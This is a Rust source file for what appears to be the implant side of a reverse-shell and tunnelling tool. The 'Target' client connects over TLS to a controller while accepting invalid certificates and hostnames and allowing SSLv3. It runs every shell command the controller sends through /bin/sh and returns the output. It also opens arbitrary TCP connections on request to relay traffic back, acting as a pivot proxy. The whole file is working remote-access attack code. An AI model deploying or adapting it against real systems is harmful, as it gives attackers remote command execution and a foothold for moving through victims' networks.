use anyhow::{bail, Result};
use log::*;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt, ReadHalf, WriteHalf};
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::task::JoinHandle;
use tokio::time::timeout;
use tokio_native_tls::native_tls::Identity;
use tokio_native_tls::native_tls::Protocol;
use tokio_native_tls::native_tls::TlsConnector as NativeTlsConnector;
use tokio_native_tls::TlsConnector as TokioTlsConnector;
use tokio_native_tls::{TlsConnector, TlsStream};

use crate::message::{ConnectionHeaderType, DataType, Message};

pub static mut PROTOCOL: (u16, u16) = (1, 1);

pub struct Target {
    addr: String,
    message_data_size: u16,
}

impl Target {
    pub fn new(addr: String) -> Self {
        Self {
            addr,
            message_data_size: 4096,
        }
    }
    pub async fn run(mut self) -> Result<()> {
        let mut identity = include_bytes!(std::env!("TARGET_KEY_FILE"));
        let identity = Identity::from_pkcs12(identity, "")?;

        let connector = NativeTlsConnector::builder()
            .identity(identity)
            .min_protocol_version(Some(Protocol::Sslv3))
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true)
            .build()?;

        let stream = TcpStream::connect(&self.addr).await?;
        let connector = TokioTlsConnector::from(connector);
        let mut stream = connector.connect(&self.addr, stream).await?;

        self.negotiate_protocol(&mut stream).await?;
        debug!("Protocol ok");

        let (mut reader, mut writer) = tokio::io::split(stream);
        let mut reader = Arc::new(Mutex::new(Some(reader)));
        let mut writer = Arc::new(Mutex::new(Some(writer)));

        Message::new()
            .data_type(DataType::Init)
            .data(vec![1])
            .push(&mut writer)
            .await?;

        Self::message_handler(
            self.message_data_size.into(),
            reader.clone(),
            writer.clone(),
        )
        .await?;

        Ok(())
    }
    pub async fn message_handler(
        data_size: usize,
        mut reader: Arc<Mutex<Option<ReadHalf<TlsStream<TcpStream>>>>>,
        mut writer: Arc<Mutex<Option<WriteHalf<TlsStream<TcpStream>>>>>,
    ) -> Result<()> {
        let mut shell = "/bin/sh".to_string();
        let mut proxy_connections: HashMap<u16, ProxyConnection> = HashMap::new();

        let mut i = 0usize;
        loop {
            let message = Message::pull(&mut reader).await?;
            match message.data_type {
                DataType::Init => {
                    if i == 1 {
                        if let Ok(s) = std::str::from_utf8(&message.data) {
                            shell = s.to_string();
                        }
                    }
                }
                DataType::Tty => {
                    let data = std::str::from_utf8(&message.data).unwrap();
                    if let Ok(output) = tokio::process::Command::new(&shell)
                        .arg("-c")
                        .arg(data)
                        .output()
                        .await
                    {
                        let mut output = output.stdout;
                        loop {
                            let mut end = data_size;
                            if output.len() < data_size {
                                end = output.len();
                            }
                            let buf: Vec<u8> = output.drain(..end).collect();
                            Message::new()
                                .data_type(DataType::Tty)
                                .data(buf)
                                .push(&mut writer)
                                .await?;
                            if output.len() < 1 {
                                break;
                            }
                        }
                    }
                }
                DataType::Connection => {
                    debug!("Connection: {message:?}");
                    let id = message.header_id;
                    let message_type = ConnectionHeaderType::from(message.header_type);
                    debug!("ConnectionHeaderType: {message_type:?}");
                    match message_type {
                        ConnectionHeaderType::Data => {
                            if let Some(proxy_connection) = proxy_connections.get_mut(&id) {
                                if let Err(_) =
                                    proxy_connection.writer.write_all(&message.data).await
                                {
                                    proxy_connections.remove(&id);
                                } else if proxy_connection.task.is_finished() {
                                    proxy_connections.remove(&id);
                                }
                            }
                        }
                        ConnectionHeaderType::Create => {
                            let _ = proxy_connections.remove(&id);
                            let addr = std::str::from_utf8(&message.data)?;
                            if let Ok(proxy_connection) =
                                ProxyConnection::new(id, addr, writer.clone()).await
                            {
                                proxy_connections.insert(id, proxy_connection);
                                Message::new()
                                    .header_id(id)
                                    .data_type(DataType::Connection)
                                    .header_type(ConnectionHeaderType::Connected)
                                    .push(&mut writer)
                                    .await?;
                            } else {
                                Message::new()
                                    .header_id(id)
                                    .data_type(DataType::Connection)
                                    .header_type(ConnectionHeaderType::Refused)
                                    .push(&mut writer)
                                    .await?;
                            }
                        }
                        ConnectionHeaderType::Destroy => {
                            let _ = proxy_connections.remove(&id);
                        }
                        _ => {}
                    }
                }
                _ => {
                    debug!("Unknown message: {:?}", message);
                    if let Ok(s) = std::str::from_utf8(&message.data) {
                        debug!("{s}");
                    }
                }
            }
            i += 1;
        }
    }
    pub async fn negotiate_protocol(&mut self, stream: &mut TlsStream<TcpStream>) -> Result<()> {
        let mut buf = [0u8; 2];

        // Recv proto major
        stream.read_exact(&mut buf).await?;
        let peer_proto_major = u16::from_be_bytes(buf);

        // Recv proto minor
        stream.read_exact(&mut buf).await?;
        let peer_proto_minor = u16::from_be_bytes(buf);

        debug!(
            "Received protocol version {}.{}",
            peer_proto_major, peer_proto_minor
        );

        // Send proto
        let proto = unsafe { PROTOCOL };
        debug!("Sending protocol version {}.{}", proto.0, proto.1);
        stream.write_all(&u16::to_be_bytes(proto.0)).await?;
        stream.write_all(&u16::to_be_bytes(proto.1)).await?;

        // Send desired data size
        stream
            .write_all(&u16::to_be_bytes(self.message_data_size))
            .await?;

        // Recv desired data size
        stream.read_exact(&mut buf).await?;
        let data_size = u16::from_be_bytes(buf);

        if data_size < 1024 {
            bail!("Can't agree on a message size");
        }

        if data_size < self.message_data_size {
            self.message_data_size = data_size;
        }

        debug!("Data size {}", self.message_data_size);

        Ok(())
    }
}

struct ProxyConnection {
    id: u16,
    writer: WriteHalf<TcpStream>,
    task: JoinHandle<Result<(), anyhow::Error>>,
}

impl ProxyConnection {
    async fn new(
        id: u16,
        addr: &str,
        mut control_writer: Arc<Mutex<Option<WriteHalf<TlsStream<TcpStream>>>>>,
    ) -> Result<Self> {
        let stream = TcpStream::connect(addr).await?;
        let (mut reader, mut writer) = tokio::io::split(stream);
        let task = tokio::task::spawn(async move {
            loop {
                let mut buf = [0u8; 4096];
                let bread = timeout(Duration::from_secs(5 * 60), reader.read(&mut buf)).await??;
                if bread < 1 {
                    break;
                }
                let buf = &buf[..bread];
                Message::new()
                    .data_type(DataType::Connection)
                    .header_type(ConnectionHeaderType::Data)
                    .header_id(id)
                    .data(buf.to_vec())
                    .push(&mut control_writer)
                    .await?;
            }
            Ok::<(), anyhow::Error>(())
        });
        Ok(Self { id, writer, task })
    }
}

impl Drop for ProxyConnection {
    fn drop(&mut self) {
        debug!("Dropping {}", self.id);
        self.task.abort();
    }
}
